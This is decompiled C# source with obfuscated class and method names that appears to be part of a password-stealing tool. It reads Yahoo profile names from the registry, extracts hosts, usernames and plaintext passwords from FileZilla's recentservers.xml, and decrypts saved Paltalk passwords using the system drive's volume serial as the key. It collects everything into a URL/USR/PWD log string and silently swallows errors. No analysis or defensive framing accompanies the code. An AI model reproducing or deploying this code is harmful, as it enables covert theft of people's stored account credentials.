using System;
using System.IO;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace ns5;

internal sealed class Class13
{
	public static string string_0;

	public static void smethod_0()
	{
		try
		{
			string[] subKeyNames = Registry.CurrentUser.OpenSubKey("Software\\Yahoo\\Profiles")!.GetSubKeyNames();
			foreach (string text in subKeyNames)
			{
				string_0 = string_0 + "|URL| http://Yahoo.com\r\n|USR| " + text + "\r\n|PWD| \r\n";
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_1()
	{
		try
		{
			string[] array = Strings.Split(File.ReadAllText(Interaction.Environ("APPDATA") + "\\FileZilla\\recentservers.xml"), "<Server>", -1, (CompareMethod)0);
			string[] array2 = array;
			foreach (string text in array2)
			{
				string[] array3 = Strings.Split(text, "\r\n", -1, (CompareMethod)0);
				string[] array4 = array3;
				foreach (string text2 in array4)
				{
					if (text2.Contains("<Host>"))
					{
						string_0 = string_0 + "|URL| " + Strings.Split(Strings.Split(text2, "<Host>", -1, (CompareMethod)0)[1], "</Host>", -1, (CompareMethod)0)[0] + "\r\n";
					}
					if (text2.Contains("<User>"))
					{
						string_0 = string_0 + "|USR| " + Strings.Split(Strings.Split(text2, "<User>", -1, (CompareMethod)0)[1], "</User>", -1, (CompareMethod)0)[0] + "\r\n";
					}
					if (text2.Contains("<Pass>"))
					{
						string_0 = string_0 + "|PWD| " + Strings.Split(Strings.Split(text2, "<Pass>", -1, (CompareMethod)0)[1], "</Pass>", -1, (CompareMethod)0)[0] + "\r\n";
					}
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetVolumeInformationA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_1, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_2, int int_0, ref int int_1, ref int int_2, ref int int_3, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_3, int int_4);

	public static string smethod_2()
	{
		try
		{
			string string_ = Interaction.Environ("SystemDrive") + "\\";
			string string_2 = null;
			int int_ = 0;
			int int_2 = 0;
			string string_3 = null;
			int int_3 = default(int);
			GetVolumeInformationA(ref string_, ref string_2, 0, ref int_3, ref int_, ref int_2, ref string_3, 0);
			return Conversion.Hex(int_3);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "ERR";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static void smethod_3()
	{
		checked
		{
			try
			{
				char[] array = smethod_2().ToCharArray();
				RegistryKey currentUser = Registry.CurrentUser;
				currentUser = Registry.CurrentUser.OpenSubKey("Software\\Paltalk");
				string[] subKeyNames = currentUser.GetSubKeyNames();
				currentUser.Close();
				string[] array2 = subKeyNames;
				int num = default(int);
				int num2 = default(int);
				int num3 = default(int);
				foreach (string text in array2)
				{
					string text2 = Conversions.ToString(Registry.GetValue("HKEY_CURRENT_USER\\Software\\Paltalk\\" + text, "pwd", ""));
					char[] array3 = text2.ToCharArray();
					string[] array4 = new string[(int)Math.Round((double)text2.Length / 4.0) + 1];
					while (num <= Information.UBound((Array)array3, 1) - 4)
					{
						if (num < Information.UBound((Array)array3, 1) - 4)
						{
							array4[num2] = Conversions.ToString(array3[num]) + Conversions.ToString(array3[num + 1]) + Conversions.ToString(array3[num + 2]);
						}
						num += 4;
						num2++;
					}
					string text3 = "";
					string text4 = text;
					int j = 0;
					for (int length = text4.Length; j < length; j++)
					{
						char c = text4[j];
						text3 += Conversions.ToString(c);
						if (num3 <= Information.UBound((Array)array, 1))
						{
							text3 += Conversions.ToString(array[num3]);
						}
						num3++;
					}
					text3 = text3 + text3 + text3;
					char[] array5 = text3.ToCharArray();
					string text5 = "";
					text5 += Conversions.ToString(Strings.Chr((int)Math.Round(Conversions.ToDouble(array4[0]) - 122.0 - (double)Strings.Asc(text3.Substring(text3.Length - 1, 1)))));
					int num4 = Information.UBound((Array)array4, 1);
					for (int k = 1; k <= num4; k++)
					{
						if (array4[k] != null)
						{
							char c2 = Strings.Chr((int)Math.Round(Conversions.ToDouble(array4[k]) - (double)k - (double)Strings.Asc(array5[k - 1]) - 122.0));
							text5 += Conversions.ToString(c2);
						}
					}
					string_0 = string_0 + "|URL| http://Paltalk.com\r\n|USR| " + text + "\r\n|PWD| " + text5 + "\r\n";
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}
}
